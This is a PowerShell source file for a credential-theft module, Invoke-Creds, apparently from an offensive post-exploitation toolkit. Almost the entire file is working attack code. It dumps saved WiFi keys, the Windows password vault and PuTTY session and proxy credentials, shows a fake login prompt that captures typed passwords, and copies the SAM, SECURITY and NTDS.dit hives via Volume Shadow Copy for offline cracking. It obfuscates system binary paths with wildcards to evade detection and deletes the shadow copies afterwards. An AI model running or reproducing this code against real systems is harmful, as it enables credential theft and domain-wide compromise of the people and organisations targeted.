function Invoke-Creds {
<# 

.SYNOPSIS
	Several methods for obtaining credentials from the target system.

.PARAMETER Help
	Shows Detailed Help.	
	
.PARAMETER List
	Shows Brief Command Help.

.PARAMETER WifiCreds
	Dumps saved WiFi Credentials.

.PARAMETER IeCreds
	Dumps saved Internet Explorer/Edge Credentials.

.PARAMETER AuthPrompt
	Invokes an authentication prompt to the target and captures any entered credentials.

.PARAMETER PuttyKeys
	Dumps any saved putty sessions/keys/passwords.

.PARAMETER CopySAM
	Utilizes Volume Shadow Copy to copy the SAM, SYSTEM and SECURITY files from C:\windows\system32\config. These can be parsed offline.

.PARAMETER CopyNtds
	Utilizes Volume Shadow Copy to copy the NTDS.dit and SYSTEM files. These files can be parsed offline.

.EXAMPLE 
	PS> Invoke-Creds -WifiCreds

.EXAMPLE
	PS> Invoke-Creds -PuttyKeys

.EXAMPLE
	PS> Invoke-Creds -CopySAM -Dest C:\temp\

.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WifiCreds,
	
	[Parameter(Mandatory = $False)]
	[Switch]$IeCreds,
	
	[Parameter(Mandatory = $False)]
	[Switch]$AuthPrompt,
	
	[Parameter(Mandatory = $False)]
	[Switch]$PuttyKeys,
	
	[Parameter(Mandatory = $False)]
	[Switch]$CopySAM,
	[String]$Dest,
	
	[Parameter(Mandatory = $False)]
	[Switch]$CopyNtds,
	[String]$Dest2=$Dest
)

	if ($Help -eq $True) {
		Write @"

 ### Invoke-Creds Help ###
 --------------------------------
 Available Invoke-Creds Commands:
 --------------------------------
 |---------------------------------------------------------------------|
 | -WiFiCreds                                                          |
 |---------------------------------------------------------------------|

   [*] Description: Dumps saved WiFi Credentials.

   [*] Usage: Invoke-Creds -WiFiCreds
   
   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)

 |---------------------------------------------------------------------|
 | -IeCreds                                                            |
 |---------------------------------------------------------------------|

   [*] Description: Dumps saved Internet Explorer/Edge Credentials.
   
   [*] Usage: Invoke-Creds -IeCreds
   
   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)

 |---------------------------------------------------------------------|
 | -AuthPrompt                                                         |
 |---------------------------------------------------------------------| 

   [*] Description: Invokes an authentication prompt to the target 
       and captures any entered credentials.

   [*] Usage: Invoke-Creds -AuthPrompt
   
   [*] Mitre ATT&CK Ref: T1056 (Input Capture)

 |---------------------------------------------------------------------|
 | -PuttyKeys                                                          |
 |---------------------------------------------------------------------| 

   [*] Description: Dumps any saved putty sessions/keys/passwords.

   [*] Usage: Invoke-Creds -PuttyKeys
   
   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
   
 |---------------------------------------------------------------------|
 | -CopySAM [-Dest] dest                                               |
 |---------------------------------------------------------------------| 

   [*] Description: Utilizes Volume Shadow Copy to copy the SAM, SYSTEM
       and SECURITY files from C:\windows\system32\config. These can be 
       parsed offline.

   [*] Usage: Invoke-Creds -CopySAM -Dest C:\temp\
   
   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)
   
 |---------------------------------------------------------------------|
 | -CopyNtds [-Dest] dest                                              |
 |---------------------------------------------------------------------| 

   [*] Description: Utilizes Volume Shadow Copy to copy the NTDS.dit 
       and SYSTEM files. These files can be parsed offline.

   [*] Usage: Invoke-Creds -CopyNtds -Dest C:\temp\
   
   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)
   
 \---------------------------------------------------------------------/
   
"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Creds Brief Command Usage:
 ---------------------------------
 Invoke-Creds -WiFiCreds
 Invoke-Creds -IeCreds
 Invoke-Creds -AuthPrompt
 Invoke-Creds -PuttyKeys
 Invoke-Creds -CopySAM -Dest C:\temp
 Invoke-Creds -CopyNtds -Dest C:\temp

"@
	}
	elseif ($WifiCreds) {
		
		# check for PS version in the event this is invoked from a stand-alone cmdlet
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			# https://jocha.se/blog/tech/display-all-saved-wifi-passwords
			(C:\??*?\*3?\ne?s?.e?e wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ "Wireless Profile"=$name;"Password"=$pass }} | Format-Table -AutoSize
		}
	}
	elseif ($IeCreds) {
		# check for PS version in the event this is invoked from a stand-alone cmdlet
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			# https://www.toddklindt.com/blog/_layouts/mobile/dispform.aspx?List=56f96349-3bb6-4087-94f4-7f95ff4ca81f&ID=606
			[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
			$vault = New-Object Windows.Security.Credentials.PasswordVault
			$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-List
		}
	}
	elseif ($AuthPrompt) {
		$c = Get-Credential
		$u = $c.GetNetworkCredential().username
		$p = $c.GetNetworkCredential().password

		Write "Username: $u"
		Write "Password: $p"
	}
	elseif ($PuttyKeys) {
		# check for PS version in the event this is invoked from a stand-alone cmdlet
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			$SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name | ForEach-Object { $_.split("\")[5]}
				
			foreach ($Session in $SavedSessions) {
				$HostName = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).Hostname
				$PrivateKey = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).PublicKeyFile
				$Username = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).UserName
				$ProxyHost = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyHost
				$ProxyPassword = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPassword
				$ProxyPort = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPort
				$ProxyUsername = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyUsername
				$Results = "`nSession Name: $Session`nHostname/IP: $HostName`nUserName: $UserName`nPrivate Key: $PrivateKey`nProxy Host: $ProxyHost`nProxy Port: $ProxyPort`nProxy Username: $ProxyUsername`nProxy Password: $ProxyPassword"

				Write $Results
			}
		}
	}
	elseif ($CopySAM -and $Dest) {
		# https://docs.microsoft.com/en-us/previous-versions/windows/desktop/vsswmi/create-method-in-class-win32-shadowcopy
		
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544")) -and $(Test-Path "C:\windows\system32\config\SAM")) {
		
			# create shadow copy
			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
			$class.create("C:\", "ClientAccessible")
				
			# get the Device object name and Shadow Copy ID.
			$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject -Last 1)
			$ShadowCopyID = (Get-WmiObject win32_shadowcopy | select -ExpandProperty ID | select -Last 1)
				
			# copy SYSTEM
			(C:\??*?\*3?\?md.?x? /c copy $DeviceObjectName\windows\system32\config\SYSTEM $Dest)
			
			# copy SECURITY
			(C:\??*?\*3?\?md.?x? /c copy $DeviceObjectName\windows\system32\config\SECURITY $Dest)
				
			# copy SAM
			(C:\??*?\*3?\?md.?x? /c copy $DeviceObjectName\windows\system32\config\SAM $Dest)
				
			# delete the shadow copy we created
			(C:\??*?\*3?\v?*a?mi?.?x? delete shadows /Shadow=$ShadowCopyID /quiet)
		}
		elseif (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544"))) {
			Write "`n [!] This process requires elevation. Make sure you're admin first.`n"
		}
		else {
			Write "`n [!] Can't find SAM file.`n"
		}
	}
	elseif ($CopyNtds -and $Dest) {
		
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) -and $(Test-Path "C:\windows\NTDS\NTDS.dit")) {
			# create shadow copy
			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
			$class.create("C:\", "ClientAccessible")
				
			# get the Device object name and Shadow Copy ID.
			$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject -Last 1)
			$ShadowCopyID = (Get-WmiObject win32_shadowcopy | select -ExpandProperty ID | select -Last 1)
				
			# copy NTDS
			(C:\??*?\*3?\?md.?x? /c copy $DeviceObjectName\windows\NTDS\NTDS.dit $Dest)
				
			# copy SYSTEM
			(C:\??*?\*3?\?md.?x? /c copy $DeviceObjectName\windows\system32\config\SYSTEM $Dest)
				
			# delete the shadow copy we created
			(C:\??*?\*3?\v?*a?mi?.?x? delete shadows /Shadow=$ShadowCopyID /quiet)
		}
		elseif (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544"))) {
			Write "`n [!] This process requires elevation. Make sure you're admin first.`n"
		}
		else {
			Write "`n [!] Can't find NTDS.dit file.`n"
		}
	}
}

